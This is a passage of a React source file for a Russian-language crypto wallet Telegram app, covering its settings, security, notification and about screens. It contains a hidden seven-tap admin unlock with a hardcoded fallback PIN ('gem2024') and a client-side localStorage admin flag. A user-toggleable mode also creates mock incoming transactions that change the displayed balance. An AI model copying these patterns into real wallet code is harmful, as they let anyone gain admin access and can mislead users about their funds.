      icon: <svg viewBox="0 0 24 24" fill="white" style={{ width: 18, height: 18 }}><path d="M12 2C6.48 2 2 6.48 2 12c0 4.42 2.87 8.17 6.84 9.49.5.09.68-.22.68-.48v-1.69c-2.78.6-3.37-1.34-3.37-1.34-.45-1.15-1.11-1.46-1.11-1.46-.91-.62.07-.61.07-.61 1 .07 1.53 1.03 1.53 1.03.89 1.52 2.34 1.08 2.91.83.09-.65.35-1.08.63-1.33-2.22-.25-4.56-1.11-4.56-4.95 0-1.09.39-1.99 1.03-2.69-.1-.25-.45-1.27.1-2.65 0 0 .84-.27 2.75 1.02A9.56 9.56 0 0 1 12 6.8c.85.004 1.71.115 2.51.337 1.91-1.29 2.75-1.02 2.75-1.02.55 1.38.2 2.4.1 2.65.64.7 1.03 1.6 1.03 2.69 0 3.85-2.34 4.7-4.57 4.94.36.31.68.92.68 1.85v2.75c0 .27.18.58.69.48A10.01 10.01 0 0 0 22 12c0-5.52-4.48-10-10-10z"/></svg> },
    { label: "Discord", sub: "Сообщество Gem Wallet", url: "https://discord.gg/aWXpSmwHH4", bg: "#5865F2",
      icon: <svg viewBox="0 0 24 24" fill="white" style={{ width: 18, height: 18 }}><path d="M20.317 4.37a19.79 19.79 0 0 0-4.885-1.515.074.074 0 0 0-.079.037c-.21.375-.444.864-.608 1.25a18.27 18.27 0 0 0-5.487 0 12.64 12.64 0 0 0-.617-1.25.077.077 0 0 0-.079-.037A19.736 19.736 0 0 0 3.677 4.37a.07.07 0 0 0-.032.027C.533 9.046-.32 13.58.099 18.057a.082.082 0 0 0 .031.057 19.9 19.9 0 0 0 5.993 3.03.078.078 0 0 0 .084-.028c.462-.63.874-1.295 1.226-1.994a.076.076 0 0 0-.041-.106 13.107 13.107 0 0 1-1.872-.892.077.077 0 0 1-.008-.128 10.2 10.2 0 0 0 .372-.292.074.074 0 0 1 .077-.01c3.928 1.793 8.18 1.793 12.062 0a.074.074 0 0 1 .078.01c.12.098.246.198.373.292a.077.077 0 0 1-.006.127 12.299 12.299 0 0 1-1.873.892.077.077 0 0 0-.041.107c.36.698.772 1.362 1.225 1.993a.076.076 0 0 0 .084.028 19.839 19.839 0 0 0 6.002-3.03.077.077 0 0 0 .032-.054c.5-5.177-.838-9.674-3.549-13.66a.061.061 0 0 0-.031-.03z"/></svg> },
    { label: "Reddit", sub: "r/gemwallet", url: "https://www.reddit.com/r/gemwallet", bg: "#FF4500",
      icon: <svg viewBox="0 0 24 24" fill="white" style={{ width: 18, height: 18 }}><circle cx="12" cy="8" r="2.5"/><path d="M4 13c0-1.1.9-2 2-2 .5 0 1 .2 1.4.5C8.5 10.6 10.2 10 12 10s3.5.6 4.6 1.5c.4-.3.9-.5 1.4-.5 1.1 0 2 .9 2 2s-.9 2-2 2c-.3 0-.6-.1-.9-.2C16.4 15.5 14.3 16 12 16s-4.4-.5-5.1-1.2c-.3.1-.6.2-.9.2-1.1 0-2-.9-2-2z" stroke="white" strokeWidth=".5"/><circle cx="10" cy="13" r="1"/><circle cx="14" cy="13" r="1"/><path d="M10 15c.5.5 1 .8 2 .8s1.5-.3 2-.8" stroke="white" strokeWidth="1.2" fill="none" strokeLinecap="round"/></svg> },
  ];

  return (
    <div style={{ display: "flex", flexDirection: "column", flex: 1, paddingBottom: 20 }}>
      <TopBar title="О нас" onBack={onBack} />

      <div style={{ background: "#181820", borderRadius: 16, margin: "8px 16px 0", overflow: "hidden" }}>
        {legalLinks.map((item, i) => (
          <div key={item.label} onClick={() => openInApp(item.url)}
            style={{ display: "flex", alignItems: "center", justifyContent: "space-between", padding: "16px",
              borderBottom: i < legalLinks.length - 1 ? "1px solid #2A2A2C" : "none", cursor: "pointer" }}>
            <span style={{ color: "white", fontSize: 16 }}>{item.label}</span>
            <ChevronRight />
          </div>
        ))}
      </div>

      <div style={{ color: "#888", fontSize: 13, padding: "16px 32px 8px", fontWeight: 600 }}>Сообщество</div>
      <div style={{ background: "#181820", borderRadius: 16, margin: "0 16px", overflow: "hidden" }}>
        {socialLinks.map((item, i) => (
          <div key={item.label} onClick={() => { const url = item.url; const tg = window.Telegram?.WebApp; if (url.startsWith('https://t.me/') && tg?.openTelegramLink) { tg.openTelegramLink(url); } else { openInApp(url); } }}
            style={{ display: "flex", alignItems: "center", padding: "13px 16px", cursor: "pointer",
              borderBottom: i < socialLinks.length - 1 ? "1px solid #2A2A2C" : "none" }}>
            <div style={{ width: 36, height: 36, borderRadius: 10, background: item.bg, display: "flex", alignItems: "center", justifyContent: "center", marginRight: 14, flexShrink: 0 }}>
              {item.icon}
            </div>
            <div style={{ flex: 1 }}>
              <div style={{ color: "white", fontSize: 16 }}>{item.label}</div>
              <div style={{ color: "#888", fontSize: 12, marginTop: 1 }}>{item.sub}</div>
            </div>
            <ChevronRight />
          </div>
        ))}
      </div>

      <div style={{ background: "#181820", borderRadius: 16, margin: "12px 16px 0", display: "flex", justifyContent: "space-between", padding: "16px" }}>
        <span style={{ color: "white", fontSize: 16 }}>Версия</span>
        <span style={{ color: "#888", fontSize: 16 }}>2.59</span>
      </div>
    </div>
  );
}

const SettingsScreen = memo(({ activeTab, setActiveTab, isAdmin, onAdminPanel, onWalletsClick }) => {
  const { lock, testMode, setTestMode, addMockTransaction } = useWallet();
  const [subScreen, setSubScreen] = useState(null);
  const [tapCount, setTapCount] = useState(0);
  const [showAdminPin, setShowAdminPin] = useState(false);
  const [adminPin, setAdminPin] = useState("");
  const [pinError, setPinError] = useState("");
  
  const [showMockTxModal, setShowMockTxModal] = useState(false);
  const [mockAsset, setMockAsset] = useState(BASE_ASSETS[0]);
  const [mockAmount, setMockAmount] = useState("");
  const [mockFrom, setMockFrom] = useState("");

  const tapTimerRef = useRef(null);

  function handleTitleTap() {
    const next = tapCount + 1;
    setTapCount(next);
    clearTimeout(tapTimerRef.current);
    if (next >= 7) {
      setTapCount(0);
      setShowAdminPin(true);
      setAdminPin("");
      setPinError("");
    } else {
      tapTimerRef.current = setTimeout(() => setTapCount(0), 2000);
    }
  }

  function handleAdminPinSubmit() {
    const correctPin = import.meta.env.VITE_ADMIN_PIN || "gem2024";
    if (adminPin === correctPin) {
      localStorage.setItem("gem_admin_override", "1");
      setShowAdminPin(false);
      window.location.reload();
    } else {
      setPinError("Неверный PIN");
    }
  }

  if (subScreen === "security") return <SecurityScreen onBack={() => setSubScreen(null)} />;
  if (subScreen === "notifications") return <NotificationsScreen onBack={() => setSubScreen(null)} />;
  if (subScreen === "app-settings") return <AppSettingsScreen onBack={() => setSubScreen(null)} />;
  if (subScreen === "walletconnect") return <WalletConnectScreen onBack={() => setSubScreen(null)} />;
  if (subScreen === "support") return <SupportScreen onBack={() => setSubScreen(null)} />;
  if (subScreen === "rewards") return <RewardsScreen onBack={() => setSubScreen(null)} />;
  if (subScreen === "about") return <AboutScreen onBack={() => setSubScreen(null)} />;
  if (subScreen === "price-alerts") return <PriceAlertsScreen onBack={() => setSubScreen(null)} />;

  const IconBox = ({ bg, children, border }) => (
    <div style={{ width: 36, height: 36, borderRadius: 10, background: bg || "#2A2A2C",
      border: border ? "1px solid #444" : "none",
      display: "flex", alignItems: "center", justifyContent: "center", flexShrink: 0 }}>
      {children}
    </div>
  );

  const settingsGroups = [
    [
      {
        label: "Кошельки", badge: "1",
        icon: <IconBox bg="#3B7DFF"><svg viewBox="0 0 24 24" fill="none" style={{ width: 22, height: 22 }}><path d="M12 2L3 9L12 22L21 9L12 2Z" stroke="white" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/><path d="M3 9H21" stroke="white" strokeWidth="2" strokeLinecap="round"/><path d="M12 2L12 22" stroke="white" strokeWidth="1.2" strokeLinecap="round" strokeOpacity="0.45"/></svg></IconBox>,
        onPress: onWalletsClick,
      },
      {
        label: "Безопасность",
        icon: <IconBox bg="#1C1C1E" border><svg viewBox="0 0 24 24" fill="none" style={{ width: 20, height: 20 }}><path d="M12 3L5 6.5v4.5c0 4.2 3.1 8.1 7 9.5 3.9-1.4 7-5.3 7-9.5V6.5L12 3z" stroke="white" strokeWidth="1.8" strokeLinejoin="round" fill="white" fillOpacity="0.1"/><path d="M9 12l2 2 4-4" stroke="white" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round"/></svg></IconBox>,
        onPress: () => setSubScreen("security"),
      },
    ],
    [
      {
        label: "Уведомления",
        icon: <IconBox bg="#FF3B30"><svg viewBox="0 0 24 24" fill="none" style={{ width: 20, height: 20 }}><path d="M18 8A6 6 0 0 0 6 8c0 7-3 9-3 9h18s-3-2-3-9" fill="white" fillOpacity="0.9"/><path d="M13.73 21a2 2 0 0 1-3.46 0" stroke="white" strokeWidth="1.8" strokeLinecap="round"/></svg></IconBox>,
        onPress: () => setSubScreen("notifications"),
      },
      {
        label: "Настройки",
        icon: <IconBox bg="#FF9500"><svg viewBox="0 0 24 24" fill="none" style={{ width: 20, height: 20 }}><path d="M3 7h18M3 12h18M3 17h18" stroke="white" strokeWidth="1.8" strokeLinecap="round"/><circle cx="9" cy="7" r="2.5" fill="white"/><circle cx="15" cy="12" r="2.5" fill="white"/><circle cx="9" cy="17" r="2.5" fill="white"/></svg></IconBox>,
        onPress: () => setSubScreen("app-settings"),
      },
    ],
    [
      {
        label: "WalletConnect",
        icon: <IconBox bg="#3B7DFF"><svg viewBox="0 0 24 24" fill="none" style={{ width: 20, height: 20 }}><path d="M4.5 12.5C7.5 9.5 16.5 9.5 19.5 12.5M7 15c2-2 8-2 10 0M10 17.5c.67-.67 3.33-.67 4 0" stroke="white" strokeWidth="1.8" strokeLinecap="round"/></svg></IconBox>,
        onPress: () => setSubScreen("walletconnect"),
      },
    ],
    [
      {
        label: "Тестовый режим",
        badge: testMode ? "ВКЛ" : "ВЫКЛ",
        icon: <IconBox bg={testMode ? "#34C759" : "#555"}><svg viewBox="0 0 24 24" fill="none" style={{ width: 20, height: 20 }}><path d="M12 2L2 7l10 5 10-5-10-5zM2 17l10 5 10-5M2 12l10 5 10-5" stroke="white" strokeWidth="1.5" strokeLinecap="round" strokeLinejoin="round" /></svg></IconBox>,
        onPress: () => setTestMode(!testMode),
      },
      ...(testMode ? [{
        label: "Создать транзакцию",
        icon: <IconBox bg="#3B7DFF"><svg viewBox="0 0 24 24" fill="none" style={{ width: 20, height: 20 }}><path d="M12 5v14M5 12h14" stroke="white" strokeWidth="2" strokeLinecap="round" /></svg></IconBox>,
        onPress: () => setShowMockTxModal(true),
      }] : []),
    ],
    [
      {
        label: "Поддержка",
        icon: <IconBox bg="#30D158"><svg viewBox="0 0 24 24" fill="none" style={{ width: 20, height: 20 }}><path d="M3 18v-2a9 9 0 0 1 18 0v2" stroke="white" strokeWidth="1.8" strokeLinecap="round" /><rect x="1" y="16" width="4" height="6" rx="2" fill="white" /><rect x="19" y="16" width="4" height="6" rx="2" fill="white" /></svg></IconBox>,
        onPress: () => { const tg = window.Telegram?.WebApp; if (tg?.openTelegramLink) tg.openTelegramLink('https://t.me/GemWalletSupport'); else openInApp('https://t.me/GemWalletSupport'); },
      },
      {
        label: "Награды",
        icon: <IconBox bg="#3B7DFF"><svg viewBox="0 0 24 24" fill="none" style={{ width: 22, height: 22 }}><path d="M12 2L3 9L12 22L21 9L12 2Z" stroke="white" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/><path d="M3 9H21" stroke="white" strokeWidth="2" strokeLinecap="round"/><path d="M12 2L12 22" stroke="white" strokeWidth="1.2" strokeLinecap="round" strokeOpacity="0.45"/></svg></IconBox>,
        onPress: () => setSubScreen("rewards"),
      },
      {
        label: "О нас",
        icon: <IconBox bg="#555"><svg viewBox="0 0 24 24" fill="none" style={{ width: 20, height: 20 }}><circle cx="12" cy="12" r="9" stroke="white" strokeWidth="1.8" /><path d="M12 8v1M12 11v5" stroke="white" strokeWidth="1.8" strokeLinecap="round" /></svg></IconBox>,
        onPress: () => setSubScreen("about"),
      },
    ],
  ];

  return (
    <>
      {/* Admin PIN modal */}
      {showAdminPin && (
        <div style={{ position: "fixed", inset: 0, zIndex: 9999,
          background: "rgba(0,0,0,0.75)", display: "flex", alignItems: "center", justifyContent: "center" }}
          onClick={() => setShowAdminPin(false)}>
          <div style={{ background: "#181820", borderRadius: 20, padding: "24px 20px",
            margin: "0 20px", width: "100%", maxWidth: 340, border: "1px solid #252528" }}
            onClick={e => e.stopPropagation()}>
            <div style={{ textAlign: "center", marginBottom: 20 }}>
              <div style={{ width: 48, height: 48, borderRadius: 14, margin: "0 auto 12px",
                background: "linear-gradient(135deg,#4F8FFF,#1A55E3)",
                display: "flex", alignItems: "center", justifyContent: "center" }}>
                <svg viewBox="0 0 24 24" fill="none" style={{ width: 24, height: 24 }}>
                  <path d="M12 3l7 3v5c0 4.5-3 8.5-7 10C8 19.5 5 15.5 5 11V6l7-3z" fill="white" />
                </svg>
              </div>
              <div style={{ color: "white", fontWeight: 700, fontSize: 18 }}>Администратор</div>
              <div style={{ color: "#666", fontSize: 13, marginTop: 4 }}>Введите PIN-код доступа</div>
            </div>
            <input
              type="password"
              placeholder="PIN-код"
              value={adminPin}
              onChange={e => { setAdminPin(e.target.value); setPinError(""); }}
              onKeyDown={e => e.key === "Enter" && handleAdminPinSubmit()}
              style={{ width: "100%", background: "#252530", border: pinError ? "1.5px solid #FF453A" : "1.5px solid #3A3A3C",
                borderRadius: 12, padding: "14px 16px", color: "white", fontSize: 16,
                outline: "none", fontFamily: "inherit", boxSizing: "border-box", marginBottom: 8 }}
            />
            {pinError && <div style={{ color: "#FF453A", fontSize: 13, marginBottom: 8, textAlign: "center" }}>{pinError}</div>}
            <button onClick={handleAdminPinSubmit}
              style={{ width: "100%", padding: "15px 0", borderRadius: 12, border: "none",
                background: "linear-gradient(145deg,#4F8FFF,#1A55E3)", color: "white",
                fontSize: 16, fontWeight: 600, cursor: "pointer" }}>
              Войти
            </button>
          </div>
        </div>
      )}

      {/* Mock Transaction Modal */}
      {showMockTxModal && (
        <div style={{ position: "fixed", inset: 0, zIndex: 10000,
          background: "rgba(0,0,0,0.8)", display: "flex", alignItems: "flex-end", justifyContent: "center" }}
          onClick={() => setShowMockTxModal(false)}>
          <div style={{ background: "#181820", borderRadius: "24px 24px 0 0", padding: "24px 20px 40px",
            width: "100%", maxWidth: 420, animation: "fadeSlideUp 0.3s ease both" }}
            onClick={e => e.stopPropagation()}>
            <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between", marginBottom: 24 }}>
              <span style={{ color: "white", fontWeight: 700, fontSize: 19 }}>Создать транзакцию</span>
              <button onClick={() => setShowMockTxModal(false)}
                style={{ background: "#252530", border: "none", borderRadius: "50%", width: 32, height: 32,
                  color: "#888", display: "flex", alignItems: "center", justifyContent: "center", cursor: "pointer" }}>
                ✕
              </button>
            </div>

            <div style={{ display: "flex", flexDirection: "column", gap: 20 }}>
              <div>
                <div style={{ color: "#888", fontSize: 13, marginBottom: 10, marginLeft: 4 }}>Выберите токен</div>
                <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr 1fr", gap: 8 }}>
                  {BASE_ASSETS.slice(0, 6).map(a => (
                    <button key={a.id}
                      onClick={() => setMockAsset(a)}
                      style={{ 
                        background: mockAsset?.id === a.id ? "rgba(59, 125, 255, 0.15)" : "#252530", 
                        border: `1px solid ${mockAsset?.id === a.id ? "#3B7DFF" : "#333"}`, 
                        borderRadius: 12, padding: "10px 8px",
                        display: "flex", flexDirection: "column", alignItems: "center", gap: 6, cursor: "pointer",
                        transition: "all 0.2s"
                      }}>
                      <div style={{ width: 24, height: 24 }}>
                        <TokenIcon tokenId={a.tokenId} size={24} badgeSize={10} />
                      </div>
                      <span style={{ color: "white", fontSize: 12, fontWeight: 600 }}>{a.symbol}</span>
                    </button>
                  ))}
                </div>
              </div>

              <div>
                <div style={{ color: "#888", fontSize: 13, marginBottom: 8, marginLeft: 4 }}>Сумма поступления</div>
                <div style={{ background: "#252530", borderRadius: 12, padding: "12px 16px", border: "1px solid #333" }}>
                  <input 
                    type="number" 
                    placeholder="0.00"
                    value={mockAmount}
                    onChange={e => setMockAmount(e.target.value)}
                    style={{ background: "none", border: "none", outline: "none", color: "white", fontSize: 17, width: "100%", fontWeight: 600 }}
                  />
                </div>
              </div>

              <div>
                <div style={{ color: "#888", fontSize: 13, marginBottom: 8, marginLeft: 4 }}>Адрес отправителя</div>
                <div style={{ background: "#252530", borderRadius: 12, padding: "12px 16px", border: "1px solid #333" }}>
                  <input 
                    placeholder="0x... или адрес"
                    value={mockFrom}
                    onChange={e => setMockFrom(e.target.value)}
                    style={{ background: "none", border: "none", outline: "none", color: "#ccc", fontSize: 14, width: "100%" }}
                  />
                </div>
              </div>

              <button 
                disabled={!mockAmount || !mockFrom}
                onClick={() => {
                  addMockTransaction({ 
                    assetId: mockAsset.id, 
                    amount: mockAmount, 
                    from: mockFrom 
                  });
                  setShowMockTxModal(false);
                  setMockAmount("");
                  setMockFrom("");
                  setActiveTab('home'); // Уходим на главный экран
                }}
                style={{ 
                  background: (!mockAmount || !mockFrom) ? "#333" : "#3B7DFF", 
                  color: "white", border: "none", borderRadius: 14, padding: "16px", 
                  fontSize: 16, fontWeight: 700, cursor: "pointer", marginTop: 8,
                  opacity: (!mockAmount || !mockFrom) ? 0.5 : 1
                }}>
                Создать транзакцию
              </button>
            </div>
            
            <div style={{ marginTop: 24, color: "#555", fontSize: 12, textAlign: "center", lineHeight: 1.5 }}>
              Транзакция мгновенно отобразится в истории и обновит баланс. Только для тестирования интерфейса.
            </div>
          </div>
        </div>
      )}

      <div style={{ display: "flex", alignItems: "center", justifyContent: "center", padding: "16px 20px 24px" }}>
        <span onClick={handleTitleTap}
          style={{ color: "white", fontWeight: 600, fontSize: 17, cursor: "default",
            userSelect: "none", WebkitUserSelect: "none" }}>
          Настройки{tapCount > 2 ? ` ${Array(tapCount + 1).join("·")}` : ""}
        </span>
      </div>

      <div style={{ display: "flex", flexDirection: "column", gap: 12, padding: "0 16px 90px", overflowY: "auto" }}>
        {settingsGroups.map((group, gi) => (
          <div key={gi} style={{ background: "#181820", borderRadius: 16, overflow: "hidden" }}>
            {group.map((item, ii) => (
              <div key={item.label} onClick={item.onPress}
                style={{ display: "flex", alignItems: "center", padding: "12px 16px", cursor: "pointer",
                  borderBottom: ii < group.length - 1 ? "1px solid #2A2A2C" : "none" }}>
                {item.icon}
                <span style={{ flex: 1, color: "white", fontSize: 16, marginLeft: 14 }}>{item.label}</span>
                {item.badge && <span style={{ color: "#888", fontSize: 15, marginRight: 6 }}>{item.badge}</span>}
                <ChevronRight />
              </div>
            ))}
          </div>
        ))}
      </div>

      {isAdmin && (
        <div style={{ padding: "12px 16px 0" }}>
          <div style={{ background: "#181820", borderRadius: 16, overflow: "hidden" }}>
            <div onClick={onAdminPanel}
              style={{ display: "flex", alignItems: "center", padding: "12px 16px", cursor: "pointer" }}>
              <div style={{ width: 36, height: 36, borderRadius: 10, background: "#FF9500",
                display: "flex", alignItems: "center", justifyContent: "center", flexShrink: 0 }}>
                <svg viewBox="0 0 24 24" fill="none" style={{ width: 20, height: 20 }}>
                  <path d="M12 2l2.4 5.4 5.6.8-4 4 .9 5.6L12 15.4l-4.9 2.4.9-5.6-4-4 5.6-.8L12 2z" stroke="white" strokeWidth="1.8" strokeLinejoin="round" />
                </svg>
              </div>
              <span style={{ flex: 1, color: "#FF9500", fontSize: 16, fontWeight: 600, marginLeft: 14 }}>Панель администратора</span>
              <svg viewBox="0 0 24 24" fill="none" style={{ width: 16, height: 16 }}>
                <path d="M9 18l6-6-6-6" stroke="#888" strokeWidth="2" strokeLinecap="round" />
              </svg>
            </div>
          </div>
        </div>
      )}

      <div style={{ flex: 1 }} />
    </>
  );
});

/* ─── Screen: Security ───────────────────────────────────────── */
function SecurityScreen({ onBack, onLock }) {
  const { getMnemonic, deleteWallet, lock, clearAllData, settings, updateSetting } = useWallet();
  const passEnabled = settings?.passEnabled ?? true;
  const hideBalance = settings?.hideBalance ?? false;
  const setPassEnabled = (v) => updateSetting('passEnabled', v);
  const setHideBalance = (v) => updateSetting('hideBalance', v);
  const [showSeed, setShowSeed] = useState(false);
  const [seedPassword, setSeedPassword] = useState('');
  const [mnemonic, setMnemonic] = useState('');
  const [seedError, setSeedError] = useState('');
  const [confirmDelete, setConfirmDelete] = useState(false);

  const handleShowSeed = async () => {
    setSeedError('');
    try {
      const m = await getMnemonic(seedPassword);
      setMnemonic(m);
    } catch {
      setSeedError('Неверный пароль');
    }
  };

  const Toggle = ({ value, onChange }) => (
    <div onClick={() => onChange(!value)}
      style={{ width: 44, height: 26, borderRadius: 13, background: value ? "#3B7DFF" : "#3A3A3C",
        cursor: "pointer", position: "relative", transition: "background 0.2s", flexShrink: 0 }}>
      <div style={{ position: "absolute", top: 3, left: value ? 21 : 3, width: 20, height: 20,
        borderRadius: "50%", background: "white", transition: "left 0.2s" }} />
    </div>
  );

  return (
    <div style={{ display: "flex", flexDirection: "column", flex: 1 }}>
      <div style={{ display: "flex", alignItems: "center", padding: "16px 20px", gap: 12 }}>
        <button onClick={onBack} style={{ background: "none", border: "none", cursor: "pointer", padding: 4 }}>
          <svg viewBox="0 0 24 24" fill="none" style={{ width: 22, height: 22 }}>
            <path d="M15 19l-7-7 7-7" stroke="white" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" />
          </svg>
        </button>
        <span style={{ flex: 1, color: "white", fontWeight: 600, fontSize: 17, textAlign: "center" }}>Безопасность</span>
        <div style={{ width: 30 }} />
      </div>

      <div style={{ background: "#181820", borderRadius: 16, margin: "8px 16px 12px", overflow: "hidden" }}>
        <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between", padding: "15px 16px", borderBottom: "1px solid #222228" }}>
          <span style={{ color: "white", fontSize: 16 }}>Включить пароль</span>
          <Toggle value={passEnabled} onChange={setPassEnabled} />
        </div>
        <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between", padding: "15px 16px" }}>
          <span style={{ color: "white", fontSize: 16 }}>Требуется аутентификация</span>
          <span style={{ color: "#888", fontSize: 15 }}>1 минута</span>
        </div>
      </div>

      <div style={{ background: "#181820", borderRadius: 16, margin: "0 16px", overflow: "hidden" }}>
        <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between", padding: "15px 16px" }}>
          <span style={{ color: "white", fontSize: 16 }}>Спрятать баланс</span>
          <Toggle value={hideBalance} onChange={setHideBalance} />
        </div>
      </div>

      <div style={{ background: "#181820", borderRadius: 16, margin: "12px 16px 0", overflow: "hidden" }}>
        <div onClick={() => setShowSeed(s => !s)}
          style={{ display: "flex", alignItems: "center", justifyContent: "space-between", padding: "15px 16px", cursor: "pointer", borderBottom: showSeed ? "1px solid #2A2A2C" : "none" }}>
          <span style={{ color: "white", fontSize: 16 }}>Показать seed-фразу</span>
          <span style={{ color: "#888", fontSize: 18 }}>{showSeed ? "∨" : "›"}</span>
        </div>
        {showSeed && !mnemonic && (
          <div style={{ padding: "12px 16px" }}>
            <p style={{ color: "#FF9500", fontSize: 13, marginBottom: 10, marginTop: 0 }}>⚠️ Никому не показывайте seed-фразу</p>
            <input type="password" placeholder="Введите пароль" value={seedPassword} onChange={e => setSeedPassword(e.target.value)}
              style={{ width: "100%", padding: "12px 14px", background: "#252530", border: "1px solid #333", borderRadius: 10, color: "#fff", fontSize: 15, outline: "none", boxSizing: "border-box" }} />
            {seedError && <div style={{ color: "#FF453A", fontSize: 13, marginTop: 6 }}>{seedError}</div>}
            <button onClick={handleShowSeed} style={{ width: "100%", marginTop: 10, padding: "12px", borderRadius: 10, background: "#3B7DFF", color: "white", border: "none", fontSize: 15, fontWeight: 600, cursor: "pointer" }}>Показать</button>
          </div>
        )}
        {mnemonic && (
          <div style={{ padding: "12px 16px" }}>
            <div style={{ display: "flex", flexWrap: "wrap", gap: 8, marginBottom: 12 }}>
              {mnemonic.split(' ').map((word, i) => (
                <div key={i} style={{ background: "#252530", borderRadius: 8, padding: "6px 12px", display: "flex", gap: 6 }}>
                  <span style={{ color: "#555", fontSize: 12 }}>{i + 1}</span>
                  <span style={{ color: "white", fontSize: 13 }}>{word}</span>
                </div>
              ))}
            </div>
            <button onClick={() => { setMnemonic(''); setSeedPassword(''); }} style={{ width: "100%", padding: "12px", borderRadius: 10, background: "#252530", color: "white", border: "none", fontSize: 15, cursor: "pointer" }}>Скрыть</button>
          </div>
        )}
      </div>

      <div style={{ background: "#181820", borderRadius: 16, margin: "12px 16px 0", overflow: "hidden" }}>
        <div onClick={() => { if(window.confirm("Вы уверены, что хотите очистить все данные?")) clearAllData(); }}
          style={{ display: "flex", alignItems: "center", justifyContent: "space-between", padding: "15px 16px", cursor: "pointer" }}>
          <span style={{ color: "white", fontSize: 16 }}>Очистить активность и баланс</span>
          <span style={{ color: "#888", fontSize: 18 }}>›</span>
        </div>
      </div>

      <div style={{ background: "rgba(255,59,48,0.1)", borderRadius: 16, margin: "12px 16px 24px", border: "1px solid rgba(255,59,48,0.3)", overflow: "hidden" }}>
        {!confirmDelete ? (
          <div onClick={() => setConfirmDelete(true)} style={{ display: "flex", alignItems: "center", padding: "15px 16px", cursor: "pointer" }}>
            <span style={{ flex: 1, color: "#FF453A", fontSize: 16 }}>Удалить кошелёк</span>
            <span style={{ color: "#888", fontSize: 18 }}>›</span>
          </div>
        ) : (
          <div style={{ padding: "16px" }}>
            <p style={{ color: "#FF453A", fontSize: 13, marginTop: 0, marginBottom: 12 }}>❗ Удаление необратимо. Убедитесь, что у вас есть seed-фраза!</p>
            <div style={{ display: "flex", gap: 8 }}>
              <button onClick={() => deleteWallet()} style={{ flex: 1, padding: "12px", borderRadius: 10, background: "#FF3B30", color: "white", border: "none", fontSize: 15, fontWeight: 600, cursor: "pointer" }}>Удалить</button>
              <button onClick={() => setConfirmDelete(false)} style={{ flex: 1, padding: "12px", borderRadius: 10, background: "#252530", color: "white", border: "none", fontSize: 15, cursor: "pointer" }}>Отмена</button>
            </div>
          </div>
        )}
      </div>
    </div>
  );
}

/* ─── Screen: Notifications ──────────────────────────────────── */
function NotificationsScreen({ onBack }) {
  const { settings, updateSetting } = useWallet();
  const notifEnabled = settings?.notifEnabled ?? false;
  const [subScreen, setSubScreen] = useState(null);

  const Toggle = ({ value, onChange }) => (
    <div onClick={() => onChange(!value)}
      style={{ width: 44, height: 26, borderRadius: 13, background: value ? "#3B7DFF" : "#3A3A3C",
        cursor: "pointer", position: "relative", transition: "background 0.2s", flexShrink: 0 }}>
      <div style={{ position: "absolute", top: 3, left: value ? 21 : 3, width: 20, height: 20,
        borderRadius: "50%", background: "white", transition: "left 0.2s" }} />
    </div>
  );

  const handleNotifToggle = (val) => {
    updateSetting('notifEnabled', val);
  };
  if (subScreen === "price-alerts") return <PriceAlertsScreen onBack={() => setSubScreen(null)} />;

  return (
    <div style={{ display: "flex", flexDirection: "column", flex: 1 }}>
      <div style={{ display: "flex", alignItems: "center", padding: "16px 20px", gap: 12 }}>
        <button onClick={onBack} style={{ background: "none", border: "none", cursor: "pointer", padding: 4 }}>
          <svg viewBox="0 0 24 24" fill="none" style={{ width: 22, height: 22 }}>
            <path d="M15 19l-7-7 7-7" stroke="white" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" />
          </svg>
        </button>
        <span style={{ flex: 1, color: "white", fontWeight: 600, fontSize: 17, textAlign: "center" }}>Уведомления</span>
        <div style={{ width: 30 }} />
      </div>

      <div style={{ background: "#181820", borderRadius: 16, margin: "8px 16px 12px" }}>
        <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between", padding: "15px 16px" }}>
          <span style={{ color: "white", fontSize: 16 }}>Уведомления</span>
          <Toggle value={notifEnabled} onChange={handleNotifToggle} />
        </div>
        <div style={{ padding: "0 16px 14px", color: "#888", fontSize: 13 }}>
          Уведомления приходят напрямую в чат бота.
        </div>
      </div>

      <div style={{ background: "#181820", borderRadius: 16, margin: "0 16px", overflow: "hidden" }}>
        <div onClick={() => setSubScreen("price-alerts")}
          style={{ display: "flex", alignItems: "center", padding: "15px 16px", cursor: "pointer", opacity: notifEnabled ? 1 : 0.4 }}>
          <div style={{ width: 32, height: 32, borderRadius: 8, background: "#1DB954",
            display: "flex", alignItems: "center", justifyContent: "center", marginRight: 12 }}>
            <svg viewBox="0 0 24 24" fill="none" style={{ width: 18, height: 18 }}>
              <circle cx="12" cy="12" r="9" stroke="white" strokeWidth="1.8" />
              <path d="M12 6v12M9 9h4.5a1.5 1.5 0 0 1 0 3H9m0 0h5a1.5 1.5 0 0 1 0 3H9" stroke="white" strokeWidth="1.8" strokeLinecap="round" />
            </svg>
          </div>
          <span style={{ flex: 1, color: "white", fontSize: 16 }}>Уведомления о ценах</span>
          <svg viewBox="0 0 24 24" fill="none" style={{ width: 16, height: 16 }}>
            <path d="M9 18l6-6-6-6" stroke="#888" strokeWidth="2" strokeLinecap="round" />
          </svg>
        </div>
      </div>
    </div>
  );
}

/* ─── Screen: Price Alerts ───────────────────────────────────── */
function PriceAlertsScreen({ onBack }) {
  const { settings, updateSetting, requestNotifPermission, fireNotif } = useWallet();
  const enabled = settings?.priceAlertsEnabled ?? false;
  const setEnabled = async (v) => {
    if (v) {
      const granted = await requestNotifPermission();
      if (!granted) return;
    }
    updateSetting('priceAlertsEnabled', v);
  };
  const [addingAsset, setAddingAsset] = useState(false);
  const [watchlist, setWatchlist] = useState([]);
  const [toast, setToast] = useState(null);

  const Toggle = ({ value, onChange }) => (
    <div onClick={() => onChange(!value)}
      style={{ width: 44, height: 26, borderRadius: 13, background: value ? "#3B7DFF" : "#3A3A3C",
        cursor: "pointer", position: "relative", transition: "background 0.2s", flexShrink: 0 }}>
      <div style={{ position: "absolute", top: 3, left: value ? 21 : 3, width: 20, height: 20,
        borderRadius: "50%", background: "white", transition: "left 0.2s" }} />
    </div>
  );

